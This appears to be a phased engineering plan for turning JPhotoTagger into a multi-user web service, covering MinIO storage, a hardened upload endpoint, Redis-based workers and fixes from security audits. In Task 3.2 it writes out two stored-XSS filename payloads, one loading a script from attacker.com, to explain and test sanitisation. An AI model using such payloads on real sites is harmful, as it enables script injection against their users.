# JPhotoTagger SaaS Conversion — Phase 3: Storage & Media — MinIO, Upload Pipeline, Worker

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Convert JPhotoTagger from a single-user Java Swing desktop app into a multi-user web SaaS application per the approved design (docs/plans/2026-02-24-saas-conversion-design.md).

**Architecture:** Spring Boot 3 REST API wrapping existing domain/metadata modules + React frontend + PostgreSQL + MinIO + Redis. Worker container handles image processing via Redis Streams. All services run in Docker Compose on a VPS.

**Tech Stack:** Java 21, Spring Boot 3, Gradle 8, PostgreSQL 16, MinIO, Redis 7, React 18, Vite, TanStack Query, Zustand, shadcn/ui, Tailwind, Flyway, Testcontainers, JUnit 5, Vitest, Playwright.

**Reference:** All design decisions, schemas, configurations, and security requirements are in `docs/plans/2026-02-24-saas-conversion-design.md` (v4.0). Read it before implementing any task.

**All phases:** See `docs/plans/2026-02-25-saas-conversion-index.md` for the full phase list.

---

## Changelog

### v7.0 — 2026-03-05
Revised following third security audit (`docs/plans/2026-03-05-saas-conversion-phase-3-security-audit-3.md`). Two of three findings addressed; SA3-F3 was already resolved in v6.0 as MI-6.

| ID | Change |
|----|--------|
| SA3-F1 | `original_filename` sanitized with null-safe `Jsoup.parse(s).text()` before DB write; `upload_sanitizesOriginalFilenameForDisplay()` test stub added; Phase 4 rendering note added to Task 3.2 |
| SA3-F2 | `DeleteJobConsumer` validates all three storage keys against `STORAGE_KEY_PATTERN` regex after null/blank guard; worker MinIO IAM policy tightened to `originals/*` and `thumbnails/*` sub-prefixes; test stub added |
| SA3-F3 | Already resolved in v6.0 (MI-6): `Files.deleteIfExists()` + logged IOException in ExifTool finally block |

### v6.0 — 2026-03-05
Revised following sixth critical implementation review (`docs/plans/2026-02-25-saas-conversion-phase-3-critical-review-6.md`). All four critical issues and seven minor issues addressed. Critical review 3 issues re-verified as correctly fixed in v4.0.

| ID | Change |
|----|--------|
| CI-1 | `TrashPurgeScheduler` pagination fixed: always query page 0; stable `List<Photo>` loop replacing `Slice<Photo>` offset-advancing loop; note added to verify `UnverifiedAccountPurgeScheduler` at implementation time |
| CI-2 | `MetadataExtractor` EXIF sanitization replaced `Collectors.toMap()` with `HashMap.forEach()` to handle null EXIF tag values without NPE; test added |
| CI-3 | Upload endpoint: explicit `DigestInputStream` → tmpfs temp file buffering step (Step 0) added before Tika detection and MinIO upload; `getInputStream()` called exactly once; API container tmpfs documented with `.env.example` sizing pattern; `spring.servlet.multipart.location=/tmp` added to `application.yml` spec |
| CI-4 | `PhotoJobConsumer` accepts `PENDING` and `PROCESSING` as valid initial states; `DONE`/`FAILED` are XACKed and skipped; null `storage_key` guard added (was MI-8); two tests added |
| MI-1 | `MIME_TO_EXT` allowlist replaced `Map.of()` with `Map.ofEntries()` to support >10 RAW MIME type entries without compile error |
| MI-2 | `ProcessingStatus.toDbValue()` dropped; all SQL literals updated to uppercase to match `@Enumerated(EnumType.STRING)`; SQL case consistency note added |
| MI-3 | `sanitize()` null-safe helper extracted in `MetadataExtractor`; used for `rawCaption`, `rawTitle`, `rawDescription` instead of bare `Jsoup.parse()` |
| MI-4 | `OrphanReconciliationScheduler`: non-originals paths (thumbnails/) skipped at top of loop; thumbnail keys constructed from parsed `photo_id` and included in orphan delete-job |
| MI-5 | V6 migration: pre-migration negative-value cleanup step added; `NOT VALID` + `VALIDATE CONSTRAINT` pattern used to avoid blocking table scan |
| MI-6 | ExifTool finally block uses `Files.deleteIfExists()` + logged `IOException` instead of silent `File.delete()` |
| MI-7 | `File.createTempFile()` for ExifTool output uses explicit `new File("/tmp")` directory argument, consistent with established `Path.of("/tmp")` pattern |

### v5.0 — 2026-03-04
Revised following second security audit (`docs/plans/2026-03-04-saas-conversion-phase-3-security-audit-2.md`). All five findings addressed.

| ID | Change |
|----|--------|
| SA2-F1 | `MetadataExtractor` sanitizes ALL string-typed EXIF values before JSONB assembly using `Jsoup.parse(s).text()` stream operation; test added |
| SA2-F2 | ExifTool `ProcessBuilder` stdout redirected to temp file (Option A) before `waitFor()` — eliminates pipe buffer exhaustion hang; test added |
| SA2-F3 | Java library versions pinned in plan: Tika 2.9.2, metadata-extractor 2.19.0, Jsoup 1.18.3, MinIO SDK 8.5.12; Trivy extended to JAR SBOM scan |
| SA2-F4 | Upload compensating Tx uses `GREATEST(0, used_bytes - :file_size)`; new Flyway migration adds `CHECK (used_bytes >= 0)` constraint on `users` table |
| SA2-F5 | null-`storage_key` cleanup no longer enqueues delete-jobs (storage keys unknown; MinIO orphans handled by `OrphanReconciliationScheduler`); null-key guard added to `DeleteJobConsumer` head |

### v4.0 — 2026-03-04
Revised following third critical implementation review (`docs/plans/2026-02-25-saas-conversion-phase-3-critical-review-3.md`) and first security audit (`docs/plans/2026-03-04-saas-conversion-phase-3-security-audit-1.md`). All two critical issues and all two minor issues from review 3 addressed. All eight security findings addressed.

| ID | Change |
|----|--------|
| CR3-CI-1 | PEL deduplication paginated into `Set<String>` using repeated `XPENDING ... COUNT 1000` calls before recovery scan; COUNT 100 single-call removed |
| CR3-CI-2 | Lock refresh replaced with Lua ownership-check script executed via Lettuce `sync().eval()`; recovery aborts on nil return; test added |
| CR3-MI-1 | `Files.createTempFile(Path.of("/tmp"), ...)` — compile error fix |
| CR3-MI-2 | null-`storage_key` recovery uses a single SQL CTE to atomically delete photo row and decrement `used_bytes`; `GREATEST(0, ...)` guards against negative quota |
| SA-1 | ExifTool pinned via `apt-get install libimage-exiftool-perl=X.Y.Z` (≥ 12.24 minimum); Trivy CI scan added to worker image build |
| SA-2 | Worker uses dedicated MinIO access key scoped to `GetObject`, `PutObject`, `DeleteObject` only; provisioning step added to Task 3.1; worker Docker Compose uses `WORKER_MINIO_ACCESS_KEY`/`WORKER_MINIO_SECRET_KEY` |
| SA-3 | File extension always derived from Tika MIME type via allowlist at upload time in API; `415 Unsupported Media Type` on unknown type; original filename stored in `original_filename` column for display only; never used in storage key or file I/O paths |
| SA-4 | `OrphanReconciliationScheduler` identifies orphans by `SELECT EXISTS(SELECT 1 FROM photos WHERE id = :photo_id)` — no `deleted_at` or `storage_key` filter; eliminates TOCTOU race with in-progress uploads |
| SA-5 | `MetadataExtractor` sanitizes `caption`, `title`, `description` with `Jsoup.parse(rawValue).text()` before DB write; Phase 4 note added |
| SA-6 | Added `photoStatus_anotherUsersPhotoReturns403()` test stub; ownership check citation added to Task 3.2 implementation notes |
| SA-7 | Note added: update `docs/plans/2026-02-24-saas-conversion-design.md` Section 7 worker tmpfs to `- /tmp:size=1g,mode=1777` |
| SA-8 | Worker Dockerfile spec: pin `libraw-dev`, `libvips-tools`, `libimage-exiftool-perl` to exact apt versions; pin `FROM` base image to digest |

### v3.0 — 2026-03-04
Revised following second critical implementation review (see `docs/plans/2026-02-25-saas-conversion-phase-3-critical-review-2.md`). All five critical issues and all twelve minor issues addressed. One clarification question resolved.

| ID | Change |
|----|--------|
| CI-1 | Dual-client MinIO approach: `minioInternalClient` for I/O, `minioPublicClient` for pre-signed URL generation only |
| CI-2 | Added periodic null-`storage_key` cleanup in `TrashPurgeScheduler`; critical-severity log on compensating Tx failure |
| CI-3 | Startup recovery lock TTL increased to 5 min; page-refresh pattern (TTL extended after each batch) |
| CI-4 | PEL check before re-enqueueing during startup recovery; skip photos already in PEL |
| CI-5 | Delivery count requires separate `XPENDING {id} {id} 1` call; retry logic updated accordingly |
| MI-1 | Temp file lifecycle wrapped in try-finally with `Files.deleteIfExists` |
| MI-2 | `jpt.trash.retention-days` moved to `api/src/main/resources/application.yml`; removed from worker config |
| MI-3 | Consumer hostname uses `HOSTNAME` env var with `InetAddress` fallback and `UUID` last resort |
| MI-4 | `photo-jobs` message schema defined: `photo_id` only; consumer fetches remaining fields from DB |
| MI-5 | Task 3.2 references `spring.servlet.multipart.max-file-size=200MB` per design doc [M4]; HTTP 413 on exceed |
| MI-6 | Quota exceeded changed from HTTP 403 to HTTP 402 Payment Required |
| MI-7 | ShedLock pinned to exact version; note to check Maven Central at implementation time |
| MI-8 | `TrashPurgeScheduler` pages through purged photos in batches of 500; pipeline per batch |
| MI-9 | `OrphanReconciliationScheduler` streams user IDs from DB via read-only cursor query |
| MI-10 | libraw step documented as conditional on RAW MIME types with branching logic |
| MI-11 | Full pipeline reprocessing on retry documented as accepted behavior for Phase 3 |
| MI-12 | `ProcessingException` and `ProcessTimeoutException` defined in worker module |
| CQ-3 | Worker consumer is single-threaded per container instance; scale horizontally |

### v2.0 — 2026-03-04
Revised following critical implementation review (see `docs/plans/2026-02-25-saas-conversion-phase-3-critical-review-1.md`). All five critical issues and all fifteen minor issues addressed.

| ID | Change |
|----|--------|
| CI-1 | Renamed Flyway migration from `V4__` to `V5__` to avoid collision with existing `V4__create_jpt_auth_role.sql` |
| CI-2 | Added `minio.public-url` property; `StorageService` substitutes public URL into pre-signed URLs; added public-URL assertion test |
| CI-3 | Restructured upload transaction order to narrow the row lock scope; DB insert precedes MinIO upload; compensating transaction on MinIO failure |
| CI-4 | Added distributed Redis startup lock (`SET NX PX`) before recovery re-enqueue scan |
| CI-5 | Specified XAUTOCLAIM `min-idle-time = 30 min`; exposed as `worker.streams.claim-idle-time-ms` |
| MI-1 | Resolved by CI-3 (DB row inserted before MinIO upload; orphan reconciliation remains fallback) |
| MI-2 | All test stubs now require an assertion comment before implementation begins |
| MI-3 | Added `ProcessingStatus` enum step; used in JPA entity and all worker consumers |
| MI-4 | Added retry/dead-letter policy: max 3 retries then XACK + `processing_status = 'failed'` |
| MI-5 | All `ProcessBuilder` calls use `waitFor(5, TimeUnit.MINUTES)` + `destroyForcibly()` on timeout |
| MI-6 | Worker `docker-compose.yml` service specifies `tmpfs: - /tmp:size=1g` |
| MI-7 | `photo_metadata` writes use `INSERT ... ON CONFLICT (photo_id) DO UPDATE` |
| MI-8 | `TrashPurgeScheduler` enqueues delete-jobs via Lettuce pipeline, not N individual `XADD` calls |
| MI-9 | ShedLock added for all three schedulers |
| MI-10 | `UnverifiedAccountPurgeScheduler` explicitly orders: query keys → enqueue jobs → delete DB rows |
| MI-11 | Orphan reconciliation uses per-user MinIO prefix listing and `Stream<String>` DB cursor |
| MI-12 | Removed duplicate `Files:` block in Task 3.6 |
| MI-13 | Retention days sourced from `@Value("${jpt.trash.retention-days:30}")` |
| MI-14 | Consumer group names and stable consumer name (hostname + PID) documented |
| MI-15 | `delete-jobs` stream message schema defined: `photo_id`, `original_key`, `thumbnail_sm`, `thumbnail_md` |

### v1.0 — 2026-02-25
Initial plan.

---

### Task 3.1: MinIO Configuration & Service

**Files:**
- Create: `api/src/main/java/org/jphototagger/api/config/MinioConfig.java`
- Create: `api/src/main/java/org/jphototagger/api/service/StorageService.java`

**Step 1: Provision dedicated worker MinIO access key**

The worker must use its own scoped MinIO credentials — not the API's credentials. The API credentials have full bucket access; the worker must be restricted to object-level operations only.

Create a `worker-policy.json`:
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["s3:GetObject", "s3:PutObject", "s3:DeleteObject"],
    "Resource": [
      "arn:aws:s3:::jpt-photos/*/originals/*",
      "arn:aws:s3:::jpt-photos/*/thumbnails/*"
    ]
  }]
}
```

**Why sub-prefix scoping (SA3-F2):** Restricting to `originals/*` and `thumbnails/*` means even a fully compromised worker credential cannot delete arbitrary bucket contents (e.g., other tenants' top-level objects or infrastructure backups). This limits the blast radius of a Redis-compromise or container-escape scenario at the IAM level — independent of application-level validation.

Provision via `mc`:
```bash
mc admin user add minio worker-access <strong-secret>
mc admin policy create minio worker-policy worker-policy.json
mc admin policy attach minio worker-policy --user worker-access
```

The worker Docker Compose service uses `WORKER_MINIO_ACCESS_KEY` and `WORKER_MINIO_SECRET_KEY` environment variables (separate from the API's `MINIO_ACCESS_KEY`/`MINIO_SECRET_KEY`). The worker module's `MinioConfig` uses these to construct its `MinioClient` bean.

**Step 2: Write failing tests — pre-signed URL generation**

Each test stub must include a comment describing the expected assertion before implementation begins.

```java
@Test
void generatePresignedUrl_returnsThumbnailUrlWith15MinExpiry() {
    // assert URL expiry param is <= 900 seconds and URL starts with minio.public-url
}

@Test
void generatePresignedUrl_returnsOriginalUrlWith1HourExpiry() {
    // assert URL expiry param is <= 3600 seconds and URL starts with minio.public-url
}

@Test
void generatePresignedUrl_urlBeginsWithConfiguredPublicUrl() {
    // assert returned URL begins with the value of minio.public-url, not the internal hostname
}

@Test
void minioPublicClient_isNeverUsedForUploadOrDownload() {
    // assert minioPublicClient is not invoked during upload, download, or delete operations
}
```

**Step 3: Implement MinioConfig — dual-client approach**

The MinIO Java SDK's `GetPresignedObjectUrlArgs` does not accept a base URL override — it generates URLs against the endpoint the `MinioClient` was constructed with. The correct solution is two `MinioClient` instances:

- `minioInternalClient` — configured with `minio.url` (internal Docker hostname, e.g., `http://minio:9000`). Used for all I/O: upload, download, delete.
- `minioPublicClient` — configured with `minio.public-url` (Nginx-proxied public URL, e.g., `https://example.com`). Used **only** for pre-signed URL generation. Never used for I/O.

Expose two properties:
- `minio.url` — internal Docker hostname
- `minio.public-url` — public-facing URL returned to browsers

**Step 4: Implement StorageService**

- Upload/download/delete via `minioInternalClient` only
- Generate pre-signed URLs via `minioPublicClient` only (15 min thumbnails, 1 hour originals)
- Delete objects
- Bucket path layout: `{user_id}/originals/{photo_id}.{ext}`, `{user_id}/thumbnails/{photo_id}_sm.jpg`, `{user_id}/thumbnails/{photo_id}_md.jpg`

**Step 5: Run tests, verify pass**

**Step 6: Commit**

```bash
git commit -m "feat: MinIO storage service with pre-signed URLs and public URL substitution"
```

---

### Task 3.2: Upload Endpoint with Deduplication

**Files:**
- Modify: `api/src/main/java/org/jphototagger/api/controller/PhotoController.java`
- Modify: `api/src/main/java/org/jphototagger/api/service/PhotoService.java`

**Step 1: Define `ProcessingStatus` enum**

Define a shared enum accessible to both API and worker modules:

```java
public enum ProcessingStatus {
    PENDING, PROCESSING, DONE, FAILED;
}
```

Use `@Enumerated(EnumType.STRING)` on the `Photo` JPA entity. Use this enum (not raw strings) everywhere `processing_status` is read or written.

**SQL literal case:** All native SQL referencing `processing_status` must use uppercase string literals (`'PENDING'`, `'PROCESSING'`, `'DONE'`, `'FAILED'`) to match `@Enumerated(EnumType.STRING)` storage. Do not use lowercase literals — native queries using lowercase will return 0 rows against uppercase-stored data.

**Step 2: Flyway migrations**

**V5 — fix unique constraint for soft-deleted re-uploads:**

The V1 migration's `UNIQUE (user_id, content_hash)` constraint does not exclude soft-deleted rows. Fix by replacing the full unique constraint with a partial unique index:

```sql
-- V5__fix_content_hash_unique_constraint.sql
ALTER TABLE photos DROP CONSTRAINT IF EXISTS photos_user_id_content_hash_key;
CREATE UNIQUE INDEX photos_user_content_hash_active_idx ON photos (user_id, content_hash) WHERE deleted_at IS NULL;
```

This allows re-uploading a file that was previously soft-deleted while still preventing duplicate active uploads.

**V6 — add non-negative constraint on `used_bytes` (SA2-F4):**

```sql
-- V6__add_used_bytes_non_negative_constraint.sql

-- Step 1: Repair any pre-existing negative values before constraining
UPDATE users SET used_bytes = 0 WHERE used_bytes < 0;

-- Step 2: Add constraint without validating existing rows (instant, no blocking table scan)
ALTER TABLE users
    ADD CONSTRAINT users_used_bytes_non_negative CHECK (used_bytes >= 0) NOT VALID;

-- Step 3: Validate existing rows with a weaker lock (allows concurrent reads)
ALTER TABLE users VALIDATE CONSTRAINT users_used_bytes_non_negative;
```

This is a hard backstop: any code path that would produce a negative `used_bytes` — present or future — fails with a constraint violation rather than silently corrupting data. The upload compensating Tx and the null-`storage_key` CTE both already apply `GREATEST(0, ...)` floor guards; this constraint makes the guarantee structural.

**Why `NOT VALID` + `VALIDATE CONSTRAINT`:** Adding a `CHECK` constraint without `NOT VALID` acquires `ACCESS EXCLUSIVE` and scans all existing rows. Any row with `used_bytes < 0` (from prior bugs) blocks migration. The cleanup step handles corrupt data; `NOT VALID` skips the scan (instant); `VALIDATE CONSTRAINT` confirms correctness under a weaker `SHARE UPDATE EXCLUSIVE` lock that allows concurrent reads.

**Phase 4 note:** See Phase 4 Task 4.8 for the quota display floor guard (`Math.max(0, quota.usedBytes)`) required in the settings page.

**Step 3: Write failing tests**

Each test stub must include a comment describing the expected assertion before implementation begins.

```java
@Test
void upload_streamsToMinioAndEnqueuesJob() {
    // assert HTTP 200, photo row created with processing_status=PENDING, Redis job enqueued
}

@Test
void upload_rejectsDuplicateContentHash() {
    // assert HTTP 409 when (user_id, content_hash) active row already exists
}

@Test
void upload_rejectsWhenQuotaExceeded() {
    // assert HTTP 402 when used_bytes + file_size > quota_bytes
}

@Test
void upload_concurrentDuplicatesHandledByDbConstraint() {
    // assert HTTP 409 when UniqueConstraintViolationException is caught from concurrent insert
}

@Test
void upload_rejectsUnverifiedUser() {
    // assert HTTP 403 with message "Email verification required before uploading"
}

@Test
void upload_allowsVerifiedUser() {
    // assert HTTP 200 for user with email_verified=true
}

@Test
void upload_succeedsAfterSoftDeletedDuplicate() {
    // assert HTTP 200 when same content_hash exists with deleted_at IS NOT NULL
}

@Test
void upload_minioFailureRollsBackQuotaAndPhotoRow() {
    // assert used_bytes unchanged and photo row absent when MinIO upload throws
}

@Test
void upload_withMaliciousFilenameExtension_usesNormalizedExtension() {
    // assert storage_key contains only the MIME-derived extension regardless of uploaded filename
}

@Test
void photoStatus_anotherUsersPhotoReturns403() {
    // assert GET /api/photos/{id}/status returns 403 when id belongs to a different user
}

@Test
void upload_computesSha256AndUploadsToMinioFromTempFile() {
    // assert multipartFile.getInputStream() is called exactly once;
    // assert MinIO receives correct file content via temp file path (not original stream)
}

@Test
void upload_sanitizesOriginalFilenameForDisplay() {
    // assert that a filename containing "<script>alert(1)</script>.jpg" is stripped to
    // "alert(1).jpg" (or similar plain text) before being written to photos.original_filename
}
```

**Step 4: Implement upload endpoint**

- `POST /photos/upload` — multipart upload
- **Max upload size:** Confirm `spring.servlet.multipart.max-file-size=200MB` is set in `api/src/main/resources/application.yml` per design doc [M4]. Return HTTP 413 with a user-readable message when exceeded.
- **`spring.servlet.multipart.location`:** Set to `/tmp` in `api/src/main/resources/application.yml` so Spring's own multipart temp files also land on the tmpfs mount.
- **API container tmpfs:** The API `docker-compose.yml` service must declare a tmpfs for `/tmp`. Use the `.env.example` pattern for operator-configurable sizing without modifying `docker-compose.yml`:
  ```yaml
  # docker-compose.yml
  api:
    tmpfs:
      - /tmp:size=${API_TMPFS_SIZE:-512m},mode=1777

  worker:
    tmpfs:
      - /tmp:size=${WORKER_TMPFS_SIZE:-1g},mode=1777
  ```
  ```
  # .env.example (commit this; operators copy to .env and tune for their VPS)
  API_TMPFS_SIZE=512m
  WORKER_TMPFS_SIZE=1g
  ```
  The `:-default` syntax keeps CI working without a `.env` file. Update the worker's existing tmpfs declaration in Task 3.5 to use `${WORKER_TMPFS_SIZE:-1g}` consistently.
- **Email verification gate:** Reject uploads from users where `email_verified = false` with `403 Forbidden` and message "Email verification required before uploading" (design doc v4.0, [CR#5]).
- **Quota exceeded:** Return HTTP 402 Payment Required when `used_bytes + file_size > quota_bytes`.

- **File extension derivation — MIME-based only:**
  Run Apache Tika on the file's magic bytes immediately after streaming the request body to detect the MIME type. Map to extension using a maintained allowlist:
  ```java
  private static final Map<String, String> MIME_TO_EXT = Map.ofEntries(
      Map.entry("image/jpeg",         "jpg"),
      Map.entry("image/png",          "png"),
      Map.entry("image/tiff",         "tiff"),
      Map.entry("image/x-canon-cr2",  "cr2"),
      Map.entry("image/x-nikon-nef",  "nef"),
      Map.entry("image/x-sony-arw",   "arw"),
      Map.entry("image/x-adobe-dng",  "dng")
      // add full RAW list at implementation time — check Tika's MediaType registry
      // Map.ofEntries() has no entry-count limit; Map.of() is limited to 10 pairs
  );
  ```
  If the MIME type has no mapping, reject with `415 Unsupported Media Type` before any MinIO upload or DB write.

  The user-supplied filename extension is **never** used in `storage_key` or any file I/O path. If the original filename must be preserved for user display, store it in a separate `original_filename` column (display-only). **Sanitize before storing (SA3-F1):** `multipartFile.getOriginalFilename()` is a raw HTTP multipart header value — entirely user-controlled. Apply the same `Jsoup.parse(s).text()` pattern used for EXIF fields:
  ```java
  String rawFilename = multipartFile.getOriginalFilename();
  String safeOriginalFilename = rawFilename != null ? Jsoup.parse(rawFilename).text() : null;
  ```
  Store `safeOriginalFilename`, never `rawFilename`. Without this, a filename like `"><script src=//attacker.com/x.js></script>.jpg` is written verbatim to the DB and becomes a stored XSS payload when Phase 4 renders it.

  **Phase 4 note:** `original_filename` is user-supplied and must be rendered via React text nodes only (`{photo.originalFilename}`); never via `dangerouslySetInnerHTML` or as an unescaped HTML attribute. See Phase 4 Task 4.6 for the safe EXIF rendering requirement — the same constraint applies here.

  **Rationale:** User-supplied extensions are unconstrained and user-controlled. Tika magic-byte detection is system-controlled, validated, and produces a known-good extension. This eliminates an entire class of input-confusion attacks on storage keys and temp file paths.

- **Ownership check on status endpoint:** `GET /api/photos/{id}/status` must enforce `photo.userId == currentUser.id` at the service layer — the same ownership guard used for all photo endpoints in prior phases. This is not a "lightweight read-only" exemption. Cite the Phase 2 ownership check pattern explicitly in the implementation.

- **Transaction order — keep the row lock as narrow as possible:**
  0. *(No transaction)* **Buffer request body to tmpfs temp file; compute SHA-256 simultaneously.** An HTTP multipart `InputStream` can only be consumed once — this step makes the body available to Tika (step 1) and MinIO upload (step 4) without re-reading the original stream:
     ```java
     Path uploadTemp = Files.createTempFile(Path.of("/tmp"), "upload-", ".tmp");
     try {
         MessageDigest sha256 = MessageDigest.getInstance("SHA-256");
         try (DigestInputStream dis = new DigestInputStream(multipartFile.getInputStream(), sha256)) {
             Files.copy(dis, uploadTemp, StandardCopyOption.REPLACE_EXISTING);
         }
         String contentHash = HexFormat.of().formatHex(sha256.digest());
         long fileSize = Files.size(uploadTemp);

         // ... steps 1–7 inside this try block ...

     } finally {
         Files.deleteIfExists(uploadTemp);   // guaranteed cleanup on Tika, DB, or MinIO failure
     }
     ```
     `getInputStream()` is called exactly once. All subsequent operations read from `uploadTemp`. The `finally` block guarantees temp file cleanup regardless of which step fails.
  1. *(No transaction)* Run Tika on magic bytes — read from `uploadTemp`, not the original stream → detect MIME type → map to ext via allowlist → reject 415 if no mapping
  2. *(No transaction)* Fast-path dedup check — `SELECT` by `(user_id, content_hash) WHERE deleted_at IS NULL` (read-only, no lock)
  3. **Tx 1 (milliseconds):** `SELECT FOR UPDATE` on user row → validate quota → `INSERT INTO photos` (`processing_status = 'PENDING'`, no `storage_key` yet, `file_size` and `original_filename` populated) → increment `used_bytes` → **commit**
  4. *(No transaction)* Upload to MinIO — read from `uploadTemp`
  5. **On MinIO failure:** compensating Tx — delete the photo row, decrement `used_bytes` using `GREATEST(0, used_bytes - :file_size)` (SA2-F4: floor guard consistent with the null-`storage_key` CTE; the V6 `CHECK (used_bytes >= 0)` constraint provides a hard backstop), return 500. If the compensating Tx itself fails: log at CRITICAL severity (never silent); the null-`storage_key` cleanup in `TrashPurgeScheduler` will recover the quota drift on its next run.
  6. **Tx 2 (milliseconds):** `UPDATE photos SET storage_key = ?, processing_status = 'PENDING' WHERE id = ?` → **commit**
  7. *(No transaction)* Enqueue `photo-jobs` to Redis Streams
- DB-level dedup: catch `UniqueConstraintViolationException` → 409
- This order ensures: (a) the row lock is held for milliseconds not seconds, (b) a DB row always exists before any MinIO object, so orphan reconciliation can always find and clean up on failure

**Step 5: Run tests, verify pass**

**Step 6: Commit**

```bash
git commit -m "feat: upload endpoint with dedup, quota enforcement, email gate, Redis job enqueue"
```

---

### Task 3.3: Worker — Spring Boot Application Scaffold

**Files:**
- Create: `worker/src/main/java/org/jphototagger/worker/JptWorkerApplication.java`
- Create: `worker/src/main/resources/application.yml`

**Step 1: Write failing test — worker context loads**

**Step 2: Implement worker application class**

**Step 3: Configure `application.yml`**

```yaml
worker:
  streams:
    claim-idle-time-ms: 1800000   # 30 minutes — must exceed worst-case RAW processing time
    max-retries: 3                 # Dead-letter after this many delivery attempts
  process:
    timeout-minutes: 5             # Per-tool ProcessBuilder timeout
```

Also configure restricted DB user and HikariCP pool size 5.

**Note:** `jpt.trash.retention-days: 30` belongs in `api/src/main/resources/application.yml` — `TrashPurgeScheduler` lives in the API module and will not read the worker's config. Do not add it to the worker's YAML.

**Step 4: Run tests, verify pass**

**Step 5: Commit**

```bash
git commit -m "feat: worker Spring Boot scaffold"
```

---

### Task 3.4: Worker — Redis Streams Consumer

**Files:**
- Create: `worker/src/main/java/org/jphototagger/worker/consumer/PhotoJobConsumer.java`
- Create: `worker/src/main/java/org/jphototagger/worker/consumer/DeleteJobConsumer.java`

**Consumer thread model:** Each consumer instance is single-threaded — one in-flight job at a time. Scale concurrency by running additional worker container instances, not by adding threads per instance. This keeps tmpfs sizing, DB pool usage, and XAUTOCLAIM idle-time reasoning simple and correct.

**Consumer group and consumer name:**
- `photo-jobs` stream group: `photo-processors`
- `delete-jobs` stream group: `delete-processors`
- Consumer name construction — prefer `HOSTNAME` env var (set by Docker to container ID), fall back to `InetAddress`, last resort random UUID:
  ```java
  String hostname = Optional.ofNullable(System.getenv("HOSTNAME"))
      .filter(s -> !s.isBlank())
      .orElseGet(() -> {
          try { return InetAddress.getLocalHost().getHostName(); }
          catch (UnknownHostException e) { return UUID.randomUUID().toString(); }
      });
  String consumerName = hostname + "-" + ProcessHandle.current().pid();
  ```
- Consumer name logged at startup
- Groups created with `XGROUP CREATE ... MKSTREAM` on startup if they don't exist

**`photo-jobs` stream message schema:**
```
photo_id  — UUID string of the photo to process
```
The consumer fetches `user_id`, `storage_key`, and file extension from DB using `photo_id`. No additional fields in the message.

**`delete-jobs` stream message schema:**
```
photo_id      — UUID string
original_key  — e.g., {user_id}/originals/{photo_id}.{ext}
thumbnail_sm  — e.g., {user_id}/thumbnails/{photo_id}_sm.jpg
thumbnail_md  — e.g., {user_id}/thumbnails/{photo_id}_md.jpg
```
Producer (TrashPurgeScheduler and UnverifiedAccountPurgeScheduler) must populate all four fields. Consumer deletes all three MinIO keys per message.

**Step 1: Write failing tests**

```java
@Test
void photoJobConsumer_updatesStatusToProcessing() {
    // assert processing_status=PROCESSING set before pipeline starts
}

@Test
void photoJobConsumer_validatesPhotoExistsBeforeProcessing() {
    // assert job is discarded without processing when photo not found
}

@Test
void photoJobConsumer_discardsJobForNonExistentPhoto() {
    // assert XACK called and no processing attempted for unknown photo_id
}

@Test
void photoJobConsumer_setsStatusFailedAfterMaxRetries() {
    // assert processing_status=FAILED and XACK called after delivery count >= MAX_RETRIES
}

@Test
void deleteJobConsumer_deletesOriginalAndAllThumbnails() {
    // assert all three MinIO keys (original_key, thumbnail_sm, thumbnail_md) are deleted
}

@Test
void xautoclaim_doesNotReclaimRecentlyProcessedMessages() {
    // assert messages idle < claim-idle-time-ms are not claimed
}

@Test
void startupRecovery_onlyOneInstanceReenqueuesWhenLockContested() {
    // assert only the Redis lock holder performs recovery; others skip
}

@Test
void consumer_usesStableConsumerNameAcrossRestarts() {
    // assert consumer name is hostname+PID and consistent within a process lifecycle
}

@Test
void startupRecovery_pelPaginationCoversAllEntries() {
    // assert photos whose PEL entries fall beyond position 100 are still excluded from re-enqueue
}

@Test
void startupRecovery_abortsWhenLockExpiredMidScan() {
    // assert recovery does not continue scanning after lock refresh Lua script returns nil
}

@Test
void deleteJobConsumer_xacksAndSkipsMessageWithNullOriginalKey() {
    // assert XACK is called and no MinIO delete is attempted when originalKey is null or blank (SA2-F5)
}

@Test
void photoJobConsumer_reprocessesPhotoWithProcessingStatus() {
    // assert that when photo has processing_status=PROCESSING (simulating prior worker crash
    // recovered via XAUTOCLAIM), consumer re-processes it and correctly sets DONE or FAILED
}

@Test
void photoJobConsumer_xacksAndSkipsMessageWithNullStorageKey() {
    // assert XACK is called and no MinIO download is attempted when storage_key is null
    // (photo stuck between Tx 1 and Tx 2 of upload; TrashPurgeScheduler will clean up)
}

@Test
void deleteJobConsumer_rejectsMessageWithInvalidStorageKeyFormat() {
    // assert XACK is called and no MinIO delete is attempted when originalKey is non-blank
    // but does not match STORAGE_KEY_PATTERN (e.g., "admin/backup/db-dump.sql")
}
```

**Step 2: Implement PhotoJobConsumer**

- `XREADGROUP` on `photo-jobs` stream using group `photo-processors` and stable consumer name
- After fetching photo from DB, route on all four states before doing any work:
  - `DONE` → XACK and skip (already successfully processed; duplicate delivery)
  - `FAILED` → XACK and skip (terminal state; do not re-process)
  - `PENDING` or `PROCESSING` → proceed (PROCESSING covers XAUTOCLAIM reclaim of a crashed worker's in-flight job — the most common recovery path)
  - `storage_key IS NULL` → XACK and skip (upload incomplete; `TrashPurgeScheduler` null-key cleanup will recover within 1 hour):
    ```java
    if (photo.getStorageKey() == null) {
        log.error("photo {} has null storage_key — XACK and skip; " +
                  "TrashPurgeScheduler will clean up", photoId);
        redisCommands.xack(STREAM, GROUP, messageId);
        return;
    }
    ```
- Update status to `PROCESSING`
- Call processing pipeline (Task 3.5)
- Update status to `DONE` or `FAILED`
- `XACK` on success
- **Retry / dead-letter policy:** The delivery count is **not** included in the `XREADGROUP` response (`MapRecord<String, Object, Object>`). On failure, retrieve it with a separate call:
  ```
  XPENDING photo-jobs photo-processors {messageId} {messageId} 1
  ```
  Then branch:
  - If `deliveryCount >= MAX_RETRIES` (from `worker.streams.max-retries`): set `processing_status = FAILED` in DB → `XACK` (removes from PEL) → optionally `XADD` to `dead-letter` stream for inspection
  - If under the retry limit: leave unacknowledged — XAUTOCLAIM will retry after the idle window
  - Note: XPENDING counts cumulative deliveries across all consumers in the group — correct semantic for cross-instance retry tracking

**Phase 4 note:** The `/api/photos/{id}/status` response should include a `failureReason` field (populated by the worker on terminal failure; null otherwise). See Phase 4 Task 4.5 for how the upload UI maps failure reason codes to user-readable messages.

